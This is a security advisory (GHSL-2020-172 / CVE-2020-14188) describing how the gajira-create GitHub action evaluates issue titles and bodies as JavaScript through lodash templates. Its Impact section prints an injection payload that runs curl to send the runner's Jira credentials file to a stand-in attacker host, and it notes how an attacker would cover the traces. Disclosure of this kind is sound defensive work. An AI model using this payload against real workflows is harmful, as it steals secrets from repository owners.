# GHSL-2020-172: Undocumented template expression evaluation in the gajira-create GitHub action - CVE-2020-14188

## Summary

The [gajira-create GitHub action](https://github.com/atlassian/gajira-create) supports undocumented template syntax that may lead to arbitrary code execution.

## Product

[gajira-create GitHub action](https://github.com/atlassian/gajira-create)

## Tested Version

2.0.0

## Details

### Issue: The potentially untrusted input values `summary` and `description` are evaluated as code by node.js

The action supports additional template transformation of the `summary` and `description` input values - all placeholders between double braces like `{{event.issue.body}}` are replaced with the according values from `github.event` context. The intention most probably was to use it like:

```
uses: atlassian/gajira-create@v2.0.0
with:
    summary: |
    Issue {{ event.issue.title }} created by {{ event.issue.user.login }}
    description: |
    {{ event.issue.body }}

```

i.e. without the dollar sign and the root `github` context object.

However this feature is not documented and the built-in GitHub context expressions are used by the users of the action instead, like:

```
uses: atlassian/gajira-create@v2.0.0
with:
    summary: |
    ${{ github.event.issue.title }}
    description: |
    ${{ github.event.issue.body }}

```

This may lead to a double template evaluation if the user input contains `{{}}` itself. There is even a [public issue](https://github.com/atlassian/gajira-create/issues/8) created by one of the action users that proves it does happen.

The internal template feature is implemented in a way that the user input is interpreted as javascript:

```
const _ = require('lodash')

_.templateSettings.interpolate = /{{([\s\S]+?)}}/g
const summaryTmpl = _.template(this.argv.summary)
const descriptionTmpl = _.template(this.argv.description)

this.argv.summary = summaryTmpl({ event: this.githubEvent })
this.argv.description = descriptionTmpl({ event: this.githubEvent })

```
#### Impact

This vulnerability allows for arbitrary code execution in the context of a GitHub runner. For example a user may create an issue with the title `It doesn't work on my machine` and the body

```
{{ process.mainModule.require('child_process').exec(`curl -d @${process.env.HOME}/.jira.d/credentials http://evil.com`) }}

```

which will exfiltrate the secret Jira API token to the attacker controlled server. To make the attack less visible an attacker may modify the body of the issue to `Never mind my bad.` and close it.
